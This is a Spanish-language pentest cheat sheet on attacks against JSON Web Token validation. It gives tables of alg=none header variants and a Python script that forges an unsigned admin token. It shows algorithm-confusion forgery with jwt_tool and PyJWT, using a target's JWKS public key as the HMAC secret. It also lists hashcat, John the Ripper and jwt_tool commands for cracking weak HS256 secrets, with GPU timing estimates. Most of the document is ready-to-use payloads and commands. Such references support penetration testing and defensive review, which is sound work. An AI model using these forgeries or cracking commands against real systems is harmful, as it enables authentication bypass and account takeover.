---
aliases:
  - JWT alg=none
  - JWT Algorithm Confusion
  - JWT Weak Secret
tags:
  - type/cheatsheet
  - vuln/jwt
  - vuln/auth-bypass
  - technique/credential-access
  - technique/defense-evasion
  - asset/web-app
  - cred/jwt
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[JWT Atacks]]"
---
# JWT - Ataques al Algoritmo

***

## alg=none Bypass

| **Objetivo** | **Payload / Comando** | **Notas** |
|:---:|:---:|:---:|
| Header alg none | `{"alg":"none","typ":"JWT"}` | Backend acepta tokens sin firma. |
| Variantes case bypass | `none` / `None` / `NONE` / `nOnE` | Algunos validators solo blacklistean lowercase. |
| Token sin firma | `<header_b64>.<payload_b64>.` | Tercer segmento vacío — punto final obligatorio. |
| Token con firma vacía | `<header_b64>.<payload_b64>.` (signature null) | Equivalente al anterior — algunos parsers difieren. |
| Forge con jwt_tool | `python3 jwt_tool.py <token> -X a` | Auto-genera variantes alg=none. |
| Forge manual Python | `import jwt; jwt.encode(payload,'',algorithm='none')` | PyJWT con algorithm=none. |
| Force unverified | `jwt.decode(token, options={'verify_signature':False})` | Backend mal configurado — vector. |
| Confusion `alg`/`typ` | `{"typ":"none"}` o `{"alg":"NONE","typ":"JWT"}` | Validators que filtran solo `alg`. |
| Empty alg | `{"alg":"","typ":"JWT"}` | String vacío en alg. |
| `alg=null` | `{"alg":null}` | Null literal — algunos libs interpretan como none. |
^jwt-alg-none

### Stylesheet de exploit

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
print(token)
```

___

## Algorithm Confusion (HS256 ↔ RS256)

| **Objetivo** | **Payload / Comando** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Token firmado con `RS256` (asym). Cambiar a `HS256` (sym) usando **clave pública RSA como secreto HMAC**. | Backend confunde el alg → valida con la pública como HMAC key. |
| Obtener clave pública | `curl https://target/.well-known/jwks.json` | JWKS endpoint. |
| Pública en JWT decode | `cut -d. -f1 \| base64 -d \| jq .jwk` | Si embebida en token. |
| Pública vía /jwks o /openid-config | `curl https://target/.well-known/openid-configuration` | Discovery endpoint. |
| Forge HS256 con jwt_tool | `python3 jwt_tool.py <token> -X k -pk public.pem` | Auto-confusion attack. |
| Forge manual | `jwt.encode(payload, public_key_pem, algorithm='HS256')` | PyJWT — pasar pública como secret. |
| Variante eliminar newlines | `tr -d '\n' < public.pem` | Algunos backends comparan bytes exactos. |
| Variante con CR/LF | Probar pública con `\n` final, sin `\n`, con `\r\n` | Backend puede normalizar diferente. |
| ECDSA → HMAC | `ES256 → HS256` con clave EC | Mismo principio, menos común. |
| Public key recovery | Si tenés 2 firmas RS256 distintas → derivar la pública | Tooling: `jwt-pwn` / matemática RSA. |
^jwt-alg-confusion

### Por qué funciona

- Backend usa `jwt.verify(token, key)` donde `key` se determina por `alg` declarado en el token (o por defecto la pública).
- Validators ingenuos pasan **siempre la pública** sin distinguir alg.
- Si el token declara HS256, el lib usa la pública como **bytes** para HMAC.
- Atacante puede generar HMAC con esos mismos bytes → firma válida.

___

## Weak Secret Bruteforce (HS256)

| **Objetivo** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Hashcat HS256 | `hashcat -m 16500 token.txt rockyou.txt` | Modo 16500 = JWT. |
| Hashcat con rules | `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` | Aumenta cobertura. |
| John the Ripper | `john --wordlist=rockyou.txt token.txt --format=HMAC-SHA256` | Alternativa CPU. |
| jwtcrack | `jwtcrack <token>` | Tool dedicada — bruteforce charset corto. |
| jwt_tool crack | `python3 jwt_tool.py <token> -C -d wordlist.txt` | All-in-one. |
| Crack con secret guess | `secrets.txt`: `secret`, `password`, `123456`, `key`, `<app-name>`, `<dev-name>` | Defaults comunes. |
| Mutaciones del secret | `secret`, `secret123`, `Secret!`, `SeCrEt`, `s3cr3t` | Reglas hashcat. |
| Diccionarios JWT | `jwt-secrets-list` (assetnote), `Cracken` | Wordlists especializadas. |
| Brute force charset | `hashcat -m 16500 -a 3 token.txt ?l?l?l?l?l?l?l?l` | Mask attack — hasta 8 chars lowercase. |
| GPU specs | RTX 3090 ~1.5 GH/s HS256 | 8 chars alfanum ≈ horas. |
^jwt-alg-bruteforce

### Cuándo es factible

| Longitud secret | Charset | GPU consumer | Tiempo estimado |
|---|---|---|---|
| 6 chars | a-z | RTX 3090 | < 1 min |
| 8 chars | a-z | RTX 3090 | ~30 min |
| 8 chars | a-zA-Z0-9 | RTX 3090 | ~horas |
| 10 chars | a-zA-Z0-9 | RTX 3090 | meses |
| 12+ chars random | full | — | infactible |

Si secret < 32 bytes random → probar bruteforce. Si > 32 bytes random → enfocarse en otros vectores (alg confusion / kid injection / leak).

***
